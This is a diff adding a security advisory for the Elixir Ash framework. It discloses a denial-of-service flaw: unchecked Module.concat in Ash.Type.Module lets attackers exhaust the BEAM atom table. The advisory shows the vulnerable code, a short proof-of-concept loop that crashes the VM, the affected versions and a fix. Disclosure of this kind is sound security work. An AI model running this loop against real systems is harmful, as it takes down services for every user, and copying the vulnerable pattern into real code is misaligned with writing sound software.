@@ -1,0 +1,80 @@
+---
+description: |-
+  ## Summary
+  
+  `Ash.Type.Module.cast_input/2` unconditionally creates a new Erlang atom via `Module.concat([value])` for any user-supplied binary string that starts with `"Elixir."`, before verifying whether the referenced module exists. Because Erlang atoms are never garbage-collected and the BEAM atom table has a hard default limit of approximately 1,048,576 entries, an attacker who can submit values to any resource attribute or argument of type `:module` can exhaust this table and crash the entire BEAM VM, taking down the application.
+  
+  ## Details
+  
+  **Setup**: A resource with a `:module`-typed attribute exposed to user input, which is a supported and documented usage of the `Ash.Type.Module` built-in type:
+  
+  ```elixir
+  defmodule MyApp.Widget do
+    use Ash.Resource, domain: MyApp, data_layer: AshPostgres.DataLayer
+  
+    attributes do
+      uuid_primary_key :id
+      attribute :handler_module, :module, public?: true
+    end
+  
+    actions do
+      defaults [:read, :destroy]
+      create :create do
+        accept [:handler_module]
+      end
+    end
+  end
+  ```
+  
+  **Vulnerable code** in `lib/ash/type/module.ex`, lines 105-113:
+  
+  ```elixir
+  def cast_input("Elixir." <> _ = value, _) do
+    module = Module.concat([value])   # <-- Creates new atom unconditionally
+    if Code.ensure_loaded?(module) do
+      {:ok, module}
+    else
+      :error                          # <-- Returns error but atom is already created
+    end
+  end
+  ```
+  
+  **Exploit**: Submit repeated `Ash.create` requests (e.g., via a JSON API endpoint) with unique `"Elixir.*"` strings:
+  
+  ```elixir
+  # Attacker-controlled loop (or HTTP requests to an API endpoint)
+  for i <- 1..1_100_000 do
+    Ash.Changeset.for_create(MyApp.Widget, :create, %{handler_module: "Elixir.Attack#{i}"})
+    |> Ash.create()
+    # Each iteration: Module.concat(["Elixir.Attack#{i}"]) creates a new atom
+    # cast_input returns :error but the atom :"Elixir.Attack#{i}" persists
+  end
+  # After ~1,048,576 unique strings: BEAM crashes with system_limit
+  ```
+  
+  **Contrast**: The non-`"Elixir."` path in the same function correctly uses `String.to_existing_atom/1`, which is safe because it only looks up atoms that already exist:
+  
+  ```elixir
+  def cast_input(value, _) when is_binary(value) do
+    atom = String.to_existing_atom(value)   # safe - raises if atom doesn't exist
+    ...
+  end
+  ```
+  
+  **Additional occurrence**: `cast_stored/2` at line 141 contains the identical pattern, which is reachable when reading `:module`-typed values from the database if an attacker can write arbitrary `"Elixir.*"` strings to the relevant database column.
+  
+  ## Impact
+  
+  An attacker who can submit requests to any API endpoint backed by an Ash resource with a `:module`-typed attribute or argument can crash the entire BEAM VM process. This is a complete denial of service: all resources served by that VM instance (not just the targeted resource) become unavailable. The crash cannot be prevented once the atom table is full, and recovery requires a full process restart.
+  
+  **Fix direction**: Replace `Module.concat([value])` with `String.to_existing_atom(value)` wrapped in a `rescue ArgumentError` block (as already done in the non-`"Elixir."` branch), or validate that the atom already exists before calling `Module.concat` by first attempting `String.to_existing_atom` and only falling back to `Module.concat` on success.
+disclosure_date: 2026-04-01
+first_patched_versions:
+  - 3.22.0
+id: GHSA-jjf9-w5vj-r6vp
+link: https://github.com/advisories/GHSA-jjf9-w5vj-r6vp
+package: ash
+severity: high
+title: Ash.Type.Module.cast_input/2 atom exhaustion via unchecked Module.concat allows BEAM VM crash
+vulnerable_version_ranges:
+  - <= 3.21.3
